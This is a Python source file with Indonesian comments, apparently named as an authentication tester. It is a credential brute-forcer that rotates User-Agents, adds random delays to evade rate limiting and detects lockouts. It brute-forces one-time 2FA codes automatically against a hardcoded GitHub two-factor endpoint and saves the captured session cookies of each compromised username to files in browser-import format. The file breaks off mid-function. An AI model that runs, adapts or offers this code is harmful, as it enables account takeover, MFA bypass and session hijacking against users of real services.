import requests
import random
from requests.cookies import Morsel  
import time
import json
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import certifi  


class AuthTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.brute_force_detected = False
        self.last_response = None
        self.successful_usernames = set()
        self.login_page_url = None
        self.original_login_form = None
        self.response_sizes = {} # Store response sizes for comparison
        self.baseline_size = None
        self.baseline_otp_detected = False
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
        ]
        self.default_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Sec-Ch-Ua': '"(Not(A:Brand";v="99", "Google Chrome";v="132", "Chromium";v="132"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"macOS"',
            'Sec-Ch-Ua-Full-Version-List': '"(Not(A:Brand";v="99.0.0.0", "Google Chrome";v="132", "Chromium";v="132"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'Priority': 'u=0, i'
        }
        self.platforms = ['macOS', 'Windows', 'iOS', 'Linux']
      
    async def handle_otp(self, crawler, account, auto_mode=None):
        """Handle OTP verification for an account"""
        print(f"[*] Processing OTP for {account['username']}")

        # Step 1: Ambil cookies dari session setelah login
        cookies = self.session.cookies.get_dict()
        extra_headers = {
            'Referer': self.last_response.url if self.last_response else self.login_page_url,
            'User-Agent': random.choice(self.user_agents)
        }

        # Step 2: Simulasi GET /sessions/two-factor/app untuk crawl form OTP segar (seperti browser)
        otp_form_url = 'https://github.com/sessions/two-factor/app'  # Dari contoh Anda; sesuaikan jika beda host
        print(f"[*] Crawling fresh OTP form at: {otp_form_url}")
        otp_form = await crawler.crawl_otp_form(otp_form_url, extra_headers=extra_headers, cookies=cookies)

        if not otp_form:
            print(f"[-] OTP form not found for {account['username']}")
            return False, False

        # Print crawled headers and cookies
        print(f"[+] Crawled Headers from OTP form: {otp_form.get('headers', 'N/A')}")
        print(f"[+] Crawled Cookies from OTP form: {otp_form.get('cookies', 'N/A')}")

        print("[+] Potential OTP form found:")
        print(f" URL: {otp_form['action']}")
        print(f" Method: {otp_form['method']}")
        print(" Inputs:")
        for inp in otp_form.get('inputs', []):
            print(f" {inp.get('name', 'N/A')} ({inp.get('type', 'N/A')}) = {inp.get('value', '')}")

        confirm = input("[?] Is this the correct OTP form? (y/N): ").strip().lower()
        if confirm != 'y':
            print("[-] OTP form rejected by user.")
            return False, False

        # Detect length and type
        length, otp_type = self.detect_otp_details(self.last_response)
        if length:
            print(f"[+] Detected OTP length: {length}, type: {otp_type}")
        else:
            print("[-] OTP details undetected")
            length = 6
            otp_type = 'number'

        # Ask mode if not provided
        otp_auto = auto_mode
        if otp_auto is None:
            print("[?] OTP mode: 1. Manual 2. Auto (brute): ")
            otp_choice = input()
            otp_auto = otp_choice == '2'

        otp_brute_success = None

        if otp_auto:
            # Brute force (gunakan otp_form segar)
            otp_result = self.otp_bruteforce(otp_form, length, otp_type)
            if otp_result == "BLOCKED":
                print(f"[!] OTP brute detected for {account['username']}")
                return False, False
            elif otp_result:
                print(f"[+] OTP brute successful: {otp_result}")
                self.save_cookies(account['username'])
                otp_brute_success = True
                return True, otp_brute_success
            else:
                print(f"[-] OTP brute failed")
                return False, otp_brute_success
        else:
            # Manual mode: Loop untuk validasi input OTP
            while True:
                otp_code = input("Enter OTP code: ").strip()
                valid = True
                if len(otp_code) != length:
                    print(f"[-] OTP length mismatch: expected {length}, got {len(otp_code)}")
                    valid = False
                if otp_type == 'number' and not otp_code.isdigit():
                    print(f"[-] OTP type mismatch: expected number, got non-numeric")
                    valid = False
                elif otp_type == 'alphanum' and not otp_code.isalnum():
                    print(f"[-] OTP type mismatch: expected alphanumeric, got invalid characters")
                    valid = False
                
                if not valid:
                    confirm = input("Proceed anyway? (y/N): ").strip().lower()
                    if confirm == 'y':
                        # Lanjut submit meskipun invalid (user force)
                        pass
                    else:
                        continue  # Ulang input
                # Jika valid atau force, keluar loop untuk submit
                break

            # Submit OTP menggunakan form segar (di luar loop validasi)
            success = self.try_otp(otp_form, otp_code)
            if success:
                print(f"[+] OTP successful for {account['username']}")
                self.save_cookies(account['username'])
                return True, otp_brute_success
            else:
                print(f"[-] OTP incorrect or failed")
                # Optional: Ask if retry with new OTP
                retry = input("[?] Retry with new OTP? (y/N): ").strip().lower()
                if retry == 'y':
                    # Rekursif atau loop luar untuk retry (atau panggil ulang manual logic)
                    return await self.handle_otp(crawler, account, auto_mode=False)  # Rekursif untuk retry manual
                else:
                    return False, otp_brute_success



    def detect_otp_details(self, response):
        """Detect OTP length and type from form"""
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        length = None
        otp_type = 'number' # Default to number
      
        otp_keywords = ['otp', 'verification', 'two-factor', '2fa', 'twofactor', 'authenticator', 'verification code', 'mfa', 'one-time', 'security code', 'pin', 'app_otp', 'totp']
      
        for form in forms:
            # Look for OTP-like inputs (non-hidden)
            otp_inputs = []
            for inp in form.find_all('input'):
                inp_type = inp.get('type', 'text').lower()
                if inp_type == 'hidden':
                    continue
                name = inp.get('name', '').lower()
                placeholder = inp.get('placeholder', '').lower()
                id_ = inp.get('id', '').lower()
                maxlength = inp.get('maxlength', '')
              
                # Find associated label
                label = None
                if id_:
                    label = soup.find('label', {'for': id_})
                label_text = label.text.lower() if label else ''
              
                if (
                    any(kw in name for kw in otp_keywords) or
                    any(kw in placeholder for kw in otp_keywords) or
                    any(kw in label_text for kw in otp_keywords) or
                    (maxlength and maxlength in ['4', '6', '8'] and (inp_type in ['text', 'number', 'tel']))
                ):
                    otp_inputs.append(inp)
          
            if otp_inputs:
                # Single input case
                if len(otp_inputs) == 1:
                    inp = otp_inputs[0]
                    pattern = inp.get('pattern', '')
                    placeholder = inp.get('placeholder', '')
                    inputmode = inp.get('inputmode', '')
                    inp_type = inp.get('type', '')
                  
                    # Detect length
                    if '{6}' in pattern or len(placeholder.replace(' ', '')) == 6:
                        length = 6
                    elif '{4}' in pattern or len(placeholder.replace(' ', '')) == 4:
                        length = 4
                    elif inp.get('maxlength'):
                        length = int(inp.get('maxlength'))
                  
                    # Type
                    if 'numeric' in inputmode or inp_type == 'number' or '[0-9]' in pattern:
                        otp_type = 'number'
                    elif '[0-9a-fA-F]' in pattern:
                        otp_type = 'alphanum'
              
                # Multiple single-digit inputs (e.g., separate boxes)
                elif all(inp.get('maxlength') == '1' for inp in otp_inputs):
                    length = len(otp_inputs)
                    if all(inp.get('type', '') == 'number' for inp in otp_inputs):
                        otp_type = 'number'
      
        return length, otp_type
    def detect_bruteforce(self, response):
        self.last_response = response
        brute_keywords = ['too many attempts', 'blocked', 'dibatasi', 'terlalu banyak', 'blokir', 'suspicious', 'rate limit exceeded']
        if response.status_code == 429 or (response.status_code >= 500 and response.status_code < 600):
            return True
        if any(keyword in response.text.lower() for keyword in brute_keywords):
            return True
        return False
       
    def refresh_login_form(self):
        """Fetch the login page again to get fresh CSRF tokens and timestamps"""
        if not self.login_page_url:
            return None
       
        # Rotasi User-Agent dan platform
        current_ua = random.choice(self.user_agents)
        current_platform = random.choice(self.platforms)
       
        headers = self.default_headers.copy() # Mulai dari default
        headers.update({
            'User-Agent': current_ua,
            'Referer': self.login_page_url,
            'Origin': urlparse(self.base_url).scheme + '://' + urlparse(self.base_url).netloc,
            'Sec-Ch-Ua-Platform': f'"{current_platform}"',
        })
           
        response = self.session.get(self.login_page_url, headers=headers)
        if response.status_code != 200:
            return None
           
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
       
        for form in forms:
            if form.find('input', {'type': 'password'}):
                inputs = []
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                enctype = form.get('enctype', 'application/x-www-form-urlencoded').lower()
               
                if action:
                    action = urljoin(self.base_url, action)
                else:
                    action = self.login_page_url
               
                # Identify username and password fields
                username_field_candidates = []
                password_field = None
               
                for inp in form.find_all('input'):
                    input_name = inp.get('name', '')
                    input_type = inp.get('type', 'text')
                    input_value = inp.get('value', '')
                   
                    inputs.append({
                        'name': input_name,
                        'type': input_type,
                        'value': input_value
                    })
                   
                    # Check for password field
                    if input_type == 'password':
                        password_field = input_name
                   
                    # Collect potential username fields
                    if input_type in ['text', 'email', 'number']:
                        username_field_candidates.append(input_name)
               
                # Try to identify the correct username field
                username_field = None
               
                # Strategy 1: Look for common username field names
                common_username_names = ['login', 'user', 'username', 'email', 'account']
                for candidate in username_field_candidates:
                    if any(name in candidate.lower() for name in common_username_names):
                        username_field = candidate
                        break
               
                # Strategy 2: If only one candidate, use it
                if not username_field and len(username_field_candidates) == 1:
                    username_field = username_field_candidates[0]
               
                # Strategy 3: Use the first candidate
                if not username_field and username_field_candidates:
                    username_field = username_field_candidates[0]
               
                # Check if form is complicated (has tokens or session cookies with values)
                has_hidden_with_value = any(
                    inp.get('type') == 'hidden' and inp.get('value', '') != ''
                    for inp in inputs
                )
                has_session_cookie = 'Cookie' in dict(response.request.headers) and 'session' in dict(response.request.headers)['Cookie'].lower()
                is_complicated = has_hidden_with_value or has_session_cookie
               
                # Baseline OTP detected (narrowed)
                otp_keywords = ['otp', 'verification', 'two-factor', '2fa', 'twofactor', 'authenticator', 'verification code', 'mfa', 'one-time', 'security code', 'pin']
                baseline_otp_detected = any(keyword in response.text.lower() for keyword in otp_keywords) and (
                    '/sessions/two-factor' in action.lower() or 'two-factor' in self.login_page_url.lower() or 'otp' in self.login_page_url.lower()
                )
                self.baseline_otp_detected = baseline_otp_detected
               
                # Baseline size
                self.baseline_size = len(response.text)
               
                return {
                    'action': action,
                    'method': method,
                    'inputs': inputs,
                    'username_field': username_field,
                    'password_field': password_field,
                    'is_complicated': is_complicated,
                    'headers': dict(response.request.headers),
                    'baseline_size': self.baseline_size,
                    'baseline_otp_detected': self.baseline_otp_detected,
                    'enctype': enctype
                }
        return None
           
    def try_login(self, login_data, username, password):
            # Set baseline from login_data if available
            self.baseline_otp_detected = login_data.get('baseline_otp_detected', False)
            self.baseline_size = login_data.get('baseline_size', None)
            # Skip if username already successful
            if username in self.successful_usernames:
                return False, False
               
            # Store the login page URL for refreshing
            if not self.login_page_url:
                self.login_page_url = login_data.get('action', '').replace('/session', '/login')
               
            # Store original login form for comparison
            if not self.original_login_form:
                self.original_login_form = login_data
               
            # Refresh the form if it's complicated (this sets baseline)
            if login_data.get('is_complicated', False):
                fresh_login_data = self.refresh_login_form()
                if fresh_login_data:
                    login_data = fresh_login_data
               
            url = login_data['action']
            method = login_data['method'].lower()
           
            # Prepare headers dinamis
            headers = self.default_headers.copy()
            headers.update(login_data.get('headers', {})) # Ambil dari login_data atau fresh
            headers['User-Agent'] = random.choice(self.user_agents)
            headers['Referer'] = self.login_page_url
            headers['Origin'] = urlparse(self.base_url).scheme + '://' + urlparse(self.base_url).netloc
           
            # Prepare data with all form fields, including hidden ones
            data = {inp['name']: inp['value'] for inp in login_data['inputs'] if inp.get('name')}
           
            # Get the identified username and password fields
            username_field = login_data.get('username_field')
            password_field = login_data.get('password_field')
           
            if not username_field or not password_field:
                print("[-] Could not identify username or password field")
                return False, False
           
            # Update with current credentials
            data[username_field] = username
            data[password_field] = password
           
            # Print what's being posted
            print(f"[*] POST data: {data}")
            print(f"[*] Headers: {headers}")
           
            # Initialize response_sizes with baseline if first attempt
            if not self.response_sizes and self.baseline_size is not None:
                self.response_sizes['baseline'] = self.baseline_size
           
            enctype = login_data.get('enctype', 'application/x-www-form-urlencoded').lower()
            if 'Content-Type' in headers:
                del headers['Content-Type']
           
            if method == 'post':
                if 'multipart' in enctype:
                    post_data = {k: (None, str(v)) for k, v in data.items()}
                    response = self.session.post(url, files=post_data, headers=headers, allow_redirects=True)
                elif 'json' in enctype:
                    headers['Content-Type'] = 'application/json'
                    response = self.session.post(url, json=data, headers=headers, allow_redirects=True)
                else:
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    response = self.session.post(url, data=data, headers=headers, allow_redirects=True)
            else:
                response = self.session.get(url, params=data, headers=headers, allow_redirects=True)
           
            # Tambahkan delay random untuk menghindari rate limit
            time.sleep(random.uniform(0.5, 1.5))
           
            # Track redirects
            if response.history:
                print(f"[*] Redirect chain:")
                for i, redirect in enumerate(response.history):
                    print(f" {i}. {redirect.url} ({redirect.status_code})")
                print(f" Final URL: {response.url}")
           
            # Detect brute force
            if self.detect_bruteforce(response):
                self.brute_force_detected = True
                return False, False
           
            # Evaluate if login was successful
            login_success, score, otp_detected = self.evaluate_login_success(response)
           
            print(f"[*] Login score: {score}")
           
            if login_success:
                self.successful_usernames.add(username)
                # Update response sizes with this response
                self.response_sizes[username] = len(response.text)
                return True, otp_detected
            return False, otp_detected
    
    def evaluate_login_success(self, response):
        """Evaluate login success using a scoring system with context-aware checks"""
        score = 0
        soup = BeautifulSoup(response.text, 'html.parser')
        content_lower = response.text.lower()
        final_url = response.url
    
        # A. Success indicators (+1 each): Look for links or buttons with these texts
        success_indicators = ['logout', 'dashboard', 'welcome', 'my account', 'sign out', 'profile', 'logged in', 'user info', 'account', 'settings', 'balance', 'credit card', 'your information', 'session started']
        for indicator in success_indicators:
            # Check in <a> tags (navbar links)
            if soup.find('a', string=lambda text: text and indicator in text.lower()):
                score += 1
                print(f"[+] Found success indicator: '{indicator}' in <a> tag")
            # Or in visible div/span with class indicating success
            elif soup.find(lambda tag: tag.name in ['div', 'span', 'p', 'h1', 'h2', 'h3'] and indicator in tag.text.lower() and any(cls in tag.get('class', []) for cls in ['success', 'info', 'welcome'])):
                score += 1
                print(f"[+] Found success indicator: '{indicator}' in success message")
    
        # B. Failure indicators (-2 each): Look in <p>, <div> with error class, or visible alerts
        failure_indicators = ['invalid', 'incorrect', 'error', 'failed', 'wrong', 'bad', 'not found', 'try again', 'authentication failed', 'access denied', 'sorry', 'login failed']
        for indicator in failure_indicators:
            # Check in <p> tags
            if soup.find('p', string=lambda text: text and indicator in text.lower()):
                score -= 2
                print(f"[-] Found failure indicator: '{indicator}' in <p> tag")
            # Or in div with class like 'error', 'alert', etc., and not hidden
            elif soup.find('div', attrs={'class': lambda c: c and any(cls in c for cls in ['error', 'alert', 'flash-error', 'danger'])}):
                if indicator in soup.text.lower() and 'hidden' not in soup.find('div').attrs:
                    score -= 2
                    print(f"[-] Found failure indicator: '{indicator}' in visible error div")
            # Add check in <span> or <h2> etc.
            found_tag = soup.find(lambda tag: tag.name in ['span', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'] and indicator in tag.text.lower())
            if found_tag:
                score -= 2
                print(f"[-] Found failure indicator: '{indicator}' in {found_tag.name} tag")
    
        # Special handling for 'login': Check in <button> or <h1>-<h6>
        if soup.find('button', string=lambda text: text and 'login' in text.lower()) or \
        any(soup.find(f'h{i}', string=lambda text: text and 'login' in text.lower()) for i in range(1,7)):
            score -= 2
            print(f"[-] Found failure indicator: 'login' in <button> or <h#> tag")
    
        # C. Check if still on login page
        if not self.is_still_login_page(response):
            score += 1
            print("[+] Not on login page anymore")
        else:
            score -= 1
            print("[-] Still on login page")
    
        # D. Different page (redirect)
        if (final_url != self.login_page_url and
            final_url != self.original_login_form.get('action', '')):
            score += 1
            print("[+] Redirected to different page")
            if any(word in final_url.lower() for word in ['dashboard', 'home', 'profile', 'user', 'account']):
                score += 1
                print("[+] Redirected to a likely success page")
        else:
            score -= 1
            print("[-] Not redirected to different page")
    
        # E. Response size comparison (20% diff)
        current_size = len(response.text)
        if self.response_sizes:
            avg_prev_size = sum(self.response_sizes.values()) / len(self.response_sizes)
            diff_percent = abs(current_size - avg_prev_size) / avg_prev_size * 100 if avg_prev_size > 0 else 0
            if diff_percent > 20:
                score += 2
                print(f"[+] Significant response size difference: {current_size} vs avg {avg_prev_size:.2f} ({diff_percent:.2f}%)")
                # Add if larger, perhaps success
                if current_size > avg_prev_size:
                    score += 1
                    print("[+] Response larger than average, likely success")
            else:
                score -= 1
                print(f"[-] Minor response size difference: {current_size} vs avg {avg_prev_size:.2f} ({diff_percent:.2f}%)")
        else:
            print("[-] No baseline size for comparison")
    
        # F. OTP detection (+2 if detected and not in baseline): Check in form labels or inputs
        otp_keywords = ['otp', 'verification', 'two-factor', '2fa', 'twofactor', 'authenticator', 'verification code', 'mfa', 'one-time', 'security code', 'pin']
        otp_detected = False
        for keyword in otp_keywords:
            # Look in form-related elements
            if (soup.find('label', string=lambda text: text and keyword in text.lower()) or
                soup.find('input', attrs={'placeholder': lambda p: p and keyword in p.lower()}) or
                soup.find('form', {'action': lambda x: x and 'two-factor' in x.lower()})):
                otp_detected = True
                print("[+] OTP detected in HTML elements")  # Tambahan logging untuk debug
                break
        
        # PERBAIKAN: Gabungkan deteksi di URL ke otp_detected (sebelum kondisi if)
        otp_in_url = any(keyword in final_url.lower() for keyword in otp_keywords)
        otp_detected = otp_detected or otp_in_url  # Ini perubahan kunci: sekarang URL trigger otp_detected = True
        if otp_in_url:
            print("[+] OTP detected in URL")  # Tambahan logging untuk debug
        
        if otp_detected and not self.baseline_otp_detected:
            score += 2
            print("[+] OTP keywords detected (not in baseline)")
    
        # Determine success (>=3)
        login_success = score >= 3
    
        return login_success, score, otp_detected  # Sekarang otp_detected akan True jika di URL

    def evaluate_otp_success(self, response, original_otp_url):
        """Evaluate OTP success using scoring system with context-aware checks"""
        score = 0
        soup = BeautifulSoup(response.text, 'html.parser')
        content_lower = response.text.lower()
        final_url = response.url.lower()  # Lowercase for case-insensitive check
        
        # PERBAIKAN: Check status code for failure (e.g., 401 Unauthorized)
        if response.status_code in [401, 403]:
            score -= 3
            print("[-] Failure: Unauthorized status code detected")
        
        # 1. Detect response redirect
        if response.history:
            print("[+] Redirect detected")
            score += 2  # Positive for potential success
            # PERBAIKAN: Check if redirected back to OTP or login page (failure)
            if any('login' in r.url.lower() or 'otp' in r.url.lower() or 'verify' in r.url.lower() for r in response.history) or \
            'login' in final_url or 'otp' in final_url or 'verify' in final_url:
                score -= 4  # Heavy penalty for failure redirect
                print("[-] Failure: Redirected back to login/OTP page")
            # Check if redirected to a success-like page (hanya jika bukan failure URL)
            success_redirect_keywords = ['dashboard', 'home', 'profile', 'user', 'account', '/']
            if any(keyword in final_url for keyword in success_redirect_keywords) and \
            not any(keyword in final_url for keyword in ['login', 'otp', 'verify']):
                print("[+] Redirected to a likely success page")
                score += 3
            if final_url == original_otp_url.lower():
                print("[-] Redirected back to original OTP URL - likely failure")
                score -= 4
        else:
            print("[-] No redirect detected")
            if final_url == original_otp_url.lower():
                score -= 2  # Still on OTP page without redirect - possible failure
        
        # 2. Success indicators (+1 each): Look for links or buttons with these texts
        success_indicators = ['logout', 'dashboard', 'welcome', 'my account', 'sign out', 'profile', 'logged in', 'user info', 'account', 'settings', 'balance', 'credit card', 'your information', 'session started']
        for indicator in success_indicators:
            # Check in <a> tags (navbar links)
            if soup.find('a', string=lambda text: text and indicator in text.lower()):
                score += 1
                print(f"[+] Found success indicator: '{indicator}' in <a> tag")
            # Or in visible div/span with class indicating success
            elif soup.find(lambda tag: tag.name in ['div', 'span', 'p', 'h1', 'h2', 'h3'] and indicator in tag.text.lower() and any(cls in tag.get('class', []) for cls in ['success', 'info', 'welcome'])):
                score += 1
                print(f"[+] Found success indicator: '{indicator}' in success message")
        
        # 3. Strict failure detection: Require at least two specific keywords in context (e.g., 'two-factor' and 'failed')
        failure_keywords_sets = [
            ['two-factor', 'failed'],
            ['two-factor', 'incorrect'],
            ['two-factor', 'invalid'],
            ['authentication', 'failed', 'code'],
            ['verification', 'failed'],
            ['incorrect', 'authentication', 'code'],
            ['invalid', 'otp'],
            ['wrong', 'verification', 'code'],
            ['failed', '2fa'],
            ['access', 'denied', 'two-factor'],
            ['sorry', 'authentication', 'failed'],
            ['bad', 'otp', 'code'],
            ['not', 'found', 'verification'],
            ['try', 'again', 'two-factor']
        ]
        failure_detected = False
        error_elements = soup.find_all(lambda tag: tag.name in ['div', 'p', 'span'] and any(cls in tag.get('class', []) for cls in ['error', 'alert', 'flash-error', 'danger']))
        for elem in error_elements:
            elem_text_lower = elem.text.lower()
            for keyword_set in failure_keywords_sets:
                if all(kw in elem_text_lower for kw in keyword_set):
                    failure_detected = True
                    score -= 4  # Heavier penalty for strict match
                    print(f"[-] Found strict failure indicator with keywords: {', '.join(keyword_set)} in {elem.name} tag")
                    break  # Stop after finding one strict match per element
            if failure_detected:
                break  # Optional: Stop after any strict failure to avoid over-penalizing
        
        # If no strict failure, check general failures but with OTP context
        if not failure_detected:
            otp_context_keywords = ['two-factor', '2fa', 'otp', 'verification', 'authenticator', 'code', 'mfa', 'one-time', 'pin', 'security']
            general_failure_indicators = ['invalid', 'incorrect', 'error', 'failed', 'wrong', 'bad', 'not found', 'try again', 'authentication failed', 'access denied', 'sorry', 'login failed']
            for indicator in general_failure_indicators:
                found = False
                # Check in <p> tags with context in same element
                p_tags = soup.find_all('p')
                for p in p_tags:
                    text_lower = p.text.lower()
                    if indicator in text_lower and any(kw in text_lower for kw in otp_context_keywords):
                        score -= 2
                        print(f"[-] Found general failure indicator: '{indicator}' in <p> tag with OTP context")
                        found = True
                # Or in error div with context in same element
                if not found:
                    for div in error_elements:
                        text_lower = div.text.lower()
                        if indicator in text_lower and any(kw in text_lower for kw in otp_context_keywords) and 'hidden' not in div.attrs:
                            score -= 2
                            print(f"[-] Found general failure indicator: '{indicator}' in visible error div with OTP context")
                            found = True
                # Add check in <span> or <h2> etc. with context in same element
                if not found:
                    found_tag = soup.find(lambda tag: tag.name in ['span', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'] and indicator in tag.text.lower() and any(kw in tag.text.lower() for kw in otp_context_keywords))
                    if found_tag:
                        score -= 2
                        print(f"[-] Found general failure indicator: '{indicator}' in {found_tag.name} tag with OTP context")
        
        # Special handling for 'login': Check in <button> or <h1>-<h6>
        if soup.find('button', string=lambda text: text and 'login' in text.lower()) or \
        any(soup.find(f'h{i}', string=lambda text: text and 'login' in text.lower()) for i in range(1,7)):
            score -= 2
            print(f"[-] Found failure indicator: 'login' in <button> or <h#> tag")
        
        # OTP keywords (present -1, absent +1): Check if in form labels or inputs
        otp_keywords = ['otp', 'verification', 'two-factor', '2fa', 'twofactor', 'authenticator', 'verification code', 'mfa', 'one-time', 'security code', 'pin']
        otp_detected = False
        for keyword in otp_keywords:
            # Look in form-related elements
            if (soup.find('label', string=lambda text: text and keyword in text.lower()) or
                soup.find('input', attrs={'placeholder': lambda p: p and keyword in p.lower()})):
                otp_detected = True
                break
        if otp_detected:
            score -= 1
        else:
            score += 1
        
        # PERBAIKAN: Print score breakdown untuk debug
        print(f"[*] OTP evaluation score: {score} (threshold >=5)")
        
        # Adjust threshold for stricter failure detection
        return score >= 5, score  # Tingkatkan threshold ke >=5
    
    def is_still_login_page(self, response):
        """Check if the response still contains a login form"""
        soup = BeautifulSoup(response.text, 'html.parser')
       
        # Check for password fields
        if soup.find('input', {'type': 'password'}):
            return True
       
        # Check if the form structure matches the original login form
        forms = soup.find_all('form')
        for form in forms:
            username_field = self.original_login_form.get('username_field')
            password_field = self.original_login_form.get('password_field')
           
            if username_field and form.find('input', {'name': username_field}):
                if password_field and form.find('input', {'type': 'password', 'name': password_field}):
                    return True
       
        return False
    
    def check_otp_required(self):
        if not self.last_response:
            return False
       
        # Narrowed check for OTP
        soup = BeautifulSoup(self.last_response.text, 'html.parser')
        content_lower = self.last_response.text.lower()
        otp_keywords = ['otp', 'verification', 'two-factor', '2fa', 'twofactor', 'authenticator', 'verification code', 'mfa', 'one-time', 'security code', 'pin']
        otp_in_content = any(keyword in content_lower for keyword in otp_keywords)
        otp_in_url = any(keyword in self.last_response.url.lower() for keyword in otp_keywords)
        otp_form = soup.find('form')  # Simplified
        return otp_in_content or otp_in_url or otp_form is not None

    def save_cookies(self, username):
        cookies_list = []
        for cookie in self.session.cookies:
            same_site = cookie.get_nonstandard_attr('SameSite')
            if same_site:
                same_site = same_site.lower()  # Konversi ke huruf kecil sesuai aturan (lax, strict, none)
            
            secure = cookie.secure
            if same_site == "none":
                secure = True  # Pastikan secure: true jika sameSite: "none" sesuai aturan
            
            cookies_list.append({
                "name": cookie.name,
                "value": cookie.value,
                "domain": cookie.domain,
                "hostOnly": not cookie.domain.startswith('.'),  # True jika domain tidak dimulai dengan '.' (host-only)
                "path": cookie.path,
                "secure": secure,
                "httpOnly": bool(cookie.get_nonstandard_attr('HttpOnly')),
                "sameSite": same_site,  # Sudah lower, atau None jika tidak ada
                "session": cookie.expires is None,  # True jika expires None (session cookie)
                "firstPartyDomain": "",
                "partitionKey": None,
                "expirationDate": cookie.expires if cookie.expires else None,  # Null jika session
                "storeId": None
            })
        print(f"[+] Cookies obtained: {cookies_list}")  # Print for verification
        with open(f"data/cookies_{username}.txt", 'w') as f:
            json.dump(cookies_list, f, indent=4)
        print(f"[+] Cookies saved for {username}")
   
    def reset_session(self):
        self.session = requests.Session()
        self.last_response = None


    def try_otp(self, otp_form, otp_code):
        url = otp_form['action']
        method = otp_form['method'].lower()

        # Ambil semua input dengan nilai default (termasuk hidden fields seperti authenticity_token)
        data = {inp['name']: inp['value'] for inp in otp_form['inputs'] if inp['name'] and inp['value'] is not None}  # Hanya field dengan value asli non-None

        # Keyword spesifik untuk OTP (hindari kata umum seperti 'token')
        otp_keywords = ['otp', 'app_otp', 'code', 'verification_code', '2fa_code', 'mfa_code', 'totp', 'pin', 'security_code']

        # Cari kandidat OTP: Prioritaskan input KOSONG (value '' atau None) dengan tanda-tanda OTP
        otp_candidates = []
        for inp in otp_form['inputs']:
            name = inp.get('name', '').lower()
            value = inp.get('value', '')
            inp_type = inp.get('type', 'text').lower()
            placeholder = inp.get('placeholder', '').lower()
            maxlength = inp.get('maxlength', '')
            id_ = inp.get('id', '').lower()

            # Cari label terkait untuk konfirmasi (asumsi soup dari crawl tersedia)
            label_text = ''
            if id_ and hasattr(self, 'soup'):  # Asumsi soup dari crawl tersedia
                label = self.soup.find('label', {'for': id_})
                label_text = label.text.lower() if label else ''

            # Kriteria: Value kosong, non-hidden, dan punya tanda OTP
            if (
                (value == '' or value is None) and  # Prioritas: Value kosong
                inp_type != 'hidden' and inp_type in ['text', 'number', 'tel'] and
                (
                    any(kw in name for kw in otp_keywords) or  # Nama spesifik
                    any(kw in placeholder for kw in ['otp', 'code', 'enter code', 'verification', 'two-factor']) or  # Placeholder
                    any(kw in label_text for kw in ['otp', 'code', 'verification', 'two-factor'])  # Label
                ) and
                (not maxlength or maxlength in ['4', '6', '7', '8'])  # Maxlength opsional untuk OTP
            ):
                otp_candidates.append({
                    'name': inp['name'],  # Nama asli
                    'type': inp_type,
                    'placeholder': placeholder,
                    'label': label_text,
                    'maxlength': maxlength
                })

        # Debug: Print kandidat yang ditemukan
        print("[*] OTP Field Candidates:")
        for cand in otp_candidates:
            print(f"  - Name: {cand['name']}, Type: {cand['type']}, Placeholder: {cand['placeholder']}, Label: {cand['label']}, Maxlength: {cand['maxlength']}")

        if not otp_candidates:
            print("[-] Could not identify OTP field (no empty non-hidden fields with OTP indicators)")
            return False

        # Pilih kandidat terbaik: Prioritaskan yang punya maxlength atau type number
        otp_candidates.sort(key=lambda c: (c['maxlength'] != '', c['type'] == 'number'), reverse=True)
        selected_otp = otp_candidates[0]['name']  # Pilih yang pertama (terbaik)
        print(f"[+] Selected OTP field: {selected_otp}")

        # Check for split fields (input terpisah per digit, non-hidden, value kosong)
        is_split = False
        single_digits = [inp for inp in otp_form['inputs'] if inp.get('maxlength') == '1' and inp.get('type') != 'hidden' and inp.get('value', '') == '']
        if len(single_digits) > 1:
            is_split = True
            otp_fields = [inp['name'] for inp in single_digits if inp['name']]
            if len(otp_fields) != len(single_digits):
                print("[-] Inconsistent split fields names")
                return False
        else:
            otp_fields = [selected_otp]  # Single field

        # Validasi panjang OTP jika split
        length = len(otp_fields) if is_split else len(otp_code)
        if is_split and len(otp_code) != length:
            print("[-] OTP code length mismatch for split fields")
            return False

        # Isi HANYA field OTP dengan kode yang benar, jangan timpa value asli field lain
        if is_split:
            for i, char in enumerate(otp_code):
                data[otp_fields[i]] = char
        else:
            data[otp_fields[0]] = otp_code  # Isi hanya field OTP utama

        # Prepare headers: Match persis dari contoh Anda
        headers = {
            'Host': 'github.com',
            'Content-Length': str(len(str(data))),  # Dinamis seperti contoh
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"(Not(A:Brand";v="99", "Google Chrome";v="132", "Chromium";v="132"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"macOS"',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://github.com',
            'Content-Type': 'application/x-www-form-urlencoded',
